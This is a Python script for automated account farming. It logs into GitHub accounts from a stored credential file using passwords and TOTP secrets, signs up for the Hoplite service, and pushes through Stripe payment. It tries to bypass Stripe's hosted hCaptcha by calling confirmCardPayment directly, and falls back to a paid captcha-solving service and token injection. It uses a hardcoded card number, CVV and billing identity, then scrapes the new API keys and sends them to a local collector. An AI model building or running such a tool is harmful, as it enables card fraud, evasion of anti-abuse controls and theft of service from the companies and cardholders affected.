#!/usr/bin/env python3
"""Stripe direct confirmPayment approach - bypasses hosted Checkout hCaptcha."""
import asyncio, re, requests, time, pyotp, json
from camoufox.async_api import AsyncCamoufox

with open(r"C:\Users\User\tmp\hoplite-gateway\data\gh_accounts.json") as f:
    accounts = json.load(f)
acc = accounts[0]

CARD = {"num": "372526583853001", "exp": "01/29", "cvv": "0544", "name": "Brian Garcia",
        "address": "2181 W Long Sky Dr", "city": "East Rachel", "state": "KS", "zip": "84770"}
ANTI = "03ea83a89c837abf30695d43a93c0f29"

def captcha(sk, url):
    r = requests.post("https://api.anti-captcha.com/createTask", json={"clientKey": ANTI, "task": {"type": "HCaptchaTaskProxyless", "websiteURL": url, "websiteKey": sk, "isInvisible": True}}, timeout=10).json()
    tid = r.get("taskId")
    if not tid: return None
    for i in range(25):
        time.sleep(3)
        res = requests.post("https://api.anti-captcha.com/getTaskResult", json={"clientKey": ANTI, "taskId": tid}, timeout=10).json()
        if res.get("status") == "ready":
            return res.get("solution", {}).get("gRecaptchaResponse")
    return None

async def confirm_via_stripe_api(page, return_url):
    """Extract clientSecret and call stripe.confirmCardPayment directly."""
    print("  [*] Trying direct Stripe confirmPayment...")
    result = await page.evaluate(f"""() => {{
        const card = {json.dumps(CARD)};
        // Find Stripe publishable key
        let pubKey = '';
        document.querySelectorAll('script').forEach(s => {{
            if (s.src && s.src.includes('stripe.com')) {{
                const m = s.src.match(/pk_[a-zA-Z0-9]+/);
                if (m) pubKey = m[0];
            }}
        }});
        if (!pubKey) return 'no pubKey';
        // Find client secret
        let cs = '';
        const meta = document.querySelector('meta[name="stripe-publishable-key"]');
        // Try to find it in the page
        const body = document.body.innerText;
        const csMatch = body.match(/pi_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+/);
        if (csMatch) cs = csMatch[0];
        if (!cs) return 'no clientSecret';
        // Create Stripe instance and confirm
        const stripe = window.Stripe(pubKey);
        return stripe.confirmCardPayment(cs, {{
            payment_method: {{
                card: {{
                    number: card.num,
                    exp_month: parseInt(card.exp.split('/')[0]),
                    exp_year: parseInt(card.exp.split('/')[1]),
                    cvc: card.cvv
                }},
                billing_details: {{
                    name: card.name,
                    address: {{
                        line1: card.address,
                        city: card.city,
                        state: card.state,
                        postal_code: card.zip,
                        country: 'US'
                    }}
                }}
            }},
            return_url: '{return_url}'
        }}).then(r => JSON.stringify(r));
    }}""")
    print(f"  Stripe API result: {result[:200] if result else 'None'}")
    return result

async def main():
    async with AsyncCamoufox(headless=False, os="windows", humanize=True) as ctx:
        page = await ctx.new_page()
        await page.set_viewport_size({"width": 1280, "height": 900})

        # GitHub
        print("[1] GitHub login...")
        await page.goto("https://github.com/login", wait_until="domcontentloaded")
        await asyncio.sleep(2)
        await page.fill('input[name="login"]', acc['email'])
        await page.fill('input[name="password"]', acc['password'])
        await page.click('input[type="submit"]')
        await asyncio.sleep(3)
        if "two-factor" in page.url.lower():
            code = pyotp.TOTP(acc['totp']).now()
            await page.fill('input[name="app_otp"]', code); await asyncio.sleep(3)

        # Hoplite
        print("[2] Hoplite login...")
        await page.goto("https://app.hoplite.sh/login", wait_until="domcontentloaded")
        await asyncio.sleep(4)
        btn = page.locator('button[aria-label="Continue with GitHub"]')
        if await btn.count() == 0: btn = page.locator('button:has-text("GitHub")')
        await btn.first.click(); await asyncio.sleep(6)
        for _ in range(15):
            await asyncio.sleep(1)
            if "authorize" in page.url.lower():
                await page.evaluate("() => { const b = document.querySelector('.js-oauth-authorize-btn'); if(b) { b.disabled=false; b.click(); } }")
                await asyncio.sleep(4); break
            if "hoplite.sh" in page.url and "github.com" not in page.url: break

        # Plan
        print("[3] Plan screen...")
        for step in range(10):
            await asyncio.sleep(2)
            txt = await page.inner_text("body")
            if "Set Up Is All Complete" in txt or "starter threads" in txt.lower():
                c = page.locator('button:has-text("Continue")')
                if await c.count() > 0: await c.first.click(); await asyncio.sleep(4); continue
            if "Choose Your Plan" in txt or "Continue with Free" in txt:
                fb = page.locator('button:has-text("Continue with Free")')
                if await fb.count() > 0: await fb.first.click(); await asyncio.sleep(5); break
            sk = page.locator('button:has-text("Skip for now")')
            if await sk.count() > 0: await sk.first.click(); await asyncio.sleep(2); continue
            ct = page.locator('button:has-text("Continue")')
            if await ct.count() > 0: await ct.first.click(); await asyncio.sleep(3); continue
            break

        if "stripe.com" in page.url:
            print("[4] Stripe Checkout...")
            await page.wait_for_selector("input#cardNumber", timeout=20000)
            await asyncio.sleep(1.5)

            # Try direct Stripe confirmPayment first
            return_url = "https://app.hoplite.sh/settings/workspace/billing?checkout=success"
            result = await confirm_via_stripe_api(page, return_url)

            if result and "error" not in result.lower():
                print("[5] Payment confirmed via Stripe API!")
                await page.goto(return_url, wait_until="domcontentloaded")
                await asyncio.sleep(4)
            else:
                # Fallback: fill hosted form + solve captcha
                print("  [*] Stripe API failed, using hosted form...")
                await page.locator("input#cardNumber").fill(CARD["num"])
                await page.locator("input#cardExpiry").fill(CARD["exp"])
                await page.locator("input#cardCvc").fill(CARD["cvv"])
                await page.locator("input#billingName").fill(CARD["name"])
                await page.locator("input#billingPostalCode").fill(CARD["zip"])
                cs = page.locator("select#billingCountry")
                if await cs.count() > 0: await cs.select_option(value="US")

                hsk = "24ed0064-62cf-4d42-9960-5dd1a41d4e29"
                for f in page.frames:
                    if "hcaptcha" in f.url:
                        m = re.search(r"sitekey=([a-zA-Z0-9_-]+)", f.url)
                        if m: hsk = m.group(1); break
                token = captcha(hsk, page.url)
                if token:
                    await page.evaluate(f"""() => {{
                        const t = '{token}';
                        ["h-captcha-response","g-recaptcha-response"].forEach(n => {{
                            let el = document.querySelector(`[name="${{n}}"]`);
                            if (!el) {{
                                el = document.createElement("textarea");
                                el.name = n; el.style.display = "none";
                                document.body.appendChild(el);
                            }}
                            el.value = t;
                        }});
                        setTimeout(() => {{
                            document.querySelector("button[data-testid='hosted-payment-submit-button']")?.click();
                        }}, 500);
                    }}""")
                    print("[5] Waiting for redirect...")
                    for i in range(60):
                        await asyncio.sleep(1)
                        if "hoplite.sh" in page.url and "stripe.com" not in page.url: break
                    print(f"  URL: {page.url[:80]}")

        # Pro & API key
        print("[6] Pro upgrade...")
        await page.goto("https://app.hoplite.sh/settings/workspace/billing", wait_until="domcontentloaded")
        await asyncio.sleep(4)
        pro = page.locator('button:has-text("Upgrade to Pro"), button:has-text("Start 14 days of Pro")')
        if await pro.count() > 0:
            await pro.first.click(); await asyncio.sleep(5)
            if "stripe.com" in page.url:
                await confirm_via_stripe_api(page, "https://app.hoplite.sh/settings/workspace/billing?checkout=success")
                await asyncio.sleep(10)

        print("[7] API key...")
        await page.goto("https://app.hoplite.sh/settings/api-keys", wait_until="domcontentloaded")
        await asyncio.sleep(4)
        html = await page.content()
        m = re.search(r"hop_\w{40,}", html)
        if m:
            print(f"🔥🔥🔥 KEY: {m.group(0)}")
            requests.post("http://localhost:8085/api/keys", json={"key": m.group(0), "label": acc["login"]})
        else:
            cb = page.locator('button:has-text("Create")')
            if await cb.count() > 0:
                await cb.first.click(); await asyncio.sleep(2)
                ni = page.locator('input[placeholder*="name"]')
                if await ni.count() > 0: await ni.first.fill(f"{acc['login']}-key")
                cf = page.locator('button:has-text("Create"):not(:has-text("Repository"))')
                if await cf.count() > 0: await cf.last.click(); await asyncio.sleep(3)
                m2 = re.search(r"hop_\w{40,}", await page.content())
                if m2:
                    print(f"🔥🔥🔥 KEY: {m2.group(0)}")
                    requests.post("http://localhost:8085/api/keys", json={"key": m2.group(0), "label": acc["login"]})

        await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())